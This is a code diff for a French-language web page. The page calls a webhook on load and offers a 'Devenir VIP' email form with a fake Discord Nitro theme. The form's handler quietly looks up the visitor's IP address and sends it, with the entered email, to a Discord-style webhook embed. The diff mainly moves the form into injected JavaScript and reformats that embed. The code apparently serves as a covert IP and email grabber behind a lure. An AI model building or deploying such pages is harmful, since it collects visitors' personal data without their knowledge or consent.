@@ -56,24 +56,24 @@
 
         // Appelle la fonction au chargement de la page
         sendWebhookOnce();
-    </script>
 
-    <!-- Ajoutez cette partie pour gérer le formulaire VIP -->
-    <h2>Devenir VIP</h2>
-    <form id="vipForm">
-        <label for="email">Adresse E-mail :</label>
-        <input type="email" id="email" name="email" required>
-        <button type="button" onclick="becomeVIP()">Devenir VIP</button>
-    </form>
+        // Ajoutez cette partie pour gérer le formulaire VIP
+        document.body.innerHTML += `
+            <h2>Devenir VIP</h2>
+            <form id="vipForm">
+                <label for="email">Adresse E-mail :</label>
+                <input type="email" id="email" name="email" required>
+                <button type="button" onclick="becomeVIP()">Devenir VIP</button>
+            </form>
+        `;
 
-    <script>
         const becomeVIP = async () => {
             const email = document.getElementById("email").value;
             const ipAddress = await getIpAddress();
 
             const vipEmbed = {
                 title: "<:FakeNitroEmoji:1209487670561210419> Devenir VIP!",
-                description: `:FakeNitroEmoji: Nouveau membre a rejoint le site!\n:3228info: Adresse IP: ` ${ipAddress} `\n<:9353owner:1210210496180129872>  Adresse E-mail: ` ${email} ``,
+                description: `:FakeNitroEmoji: Nouveau membre a rejoint le site!\n:3228info: Adresse IP: || ${ipAddress} ||\n:email: Adresse E-mail: || ${email} ||`,
                 color: 0xFFD700
             };
 
